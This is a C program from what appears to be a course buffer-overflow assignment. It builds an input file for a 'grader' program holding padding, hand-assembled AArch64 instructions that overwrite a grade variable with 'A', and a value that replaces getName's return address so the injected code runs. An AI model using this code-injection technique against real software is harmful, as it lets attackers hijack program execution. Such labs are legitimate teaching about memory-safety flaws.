/*--------------------------------------------------------------------*/
/*   createdataA.c                                                    */
/*   Author: Connor Brown, Laura Hwa                                  */
/*                                                                    */
/*   Produces a file called dataA with the student name, a nullbyte,  */
/*   padding to preceed assembly instruction, and the instructions    */
/*   needed to move the 'A' character into the argument 1 register for*/
/*   printing as an argument to printf. Lastly, it injects the address*/
/*   of the first of these instructions into getName's x30 register to*/
/*   execute them once getName pops off the function call stack.      */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include "miniassembler.h"

/* Writes the "name" input for the grader.c prompt, byte-by-byte, to the 
   file named "dataA" */
int main (void) {
    FILE *psFile;
    char* partners = "Connor & Laura";
    int i;
    unsigned int uiCmd;
    unsigned long ulMovAdr;

    psFile = fopen("dataA", "w");

    /* print names */
    fprintf(psFile, "%s", partners);

    /* padded null bytes */
    for (i = 0; i < 18; i++) {
        fprintf(psFile, "%c", '\0');
    }

    /* 0x420078      | movw0, 'A' */
    uiCmd = MiniAssembler_mov(0, 'A');
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x42007C      |adr x1, grade */
    uiCmd = MiniAssembler_adr(1, 0x420044, 0x42007C);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420080      |strb w0, [x1] */
    uiCmd = MiniAssembler_strb(0, 1);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* 0x420084      | b 0x40089c   */
    uiCmd = MiniAssembler_b(0x40089c, 0x420084);
    fwrite(&uiCmd, sizeof(unsigned int), 1, psFile);

    /* overwrite getName()'s x30 with address where mov command begins. */
    ulMovAdr = 0x420078;
    fwrite(&ulMovAdr, sizeof(unsigned long), 1, psFile);

    /* close the file */
    fclose(psFile);

    return 0;
}
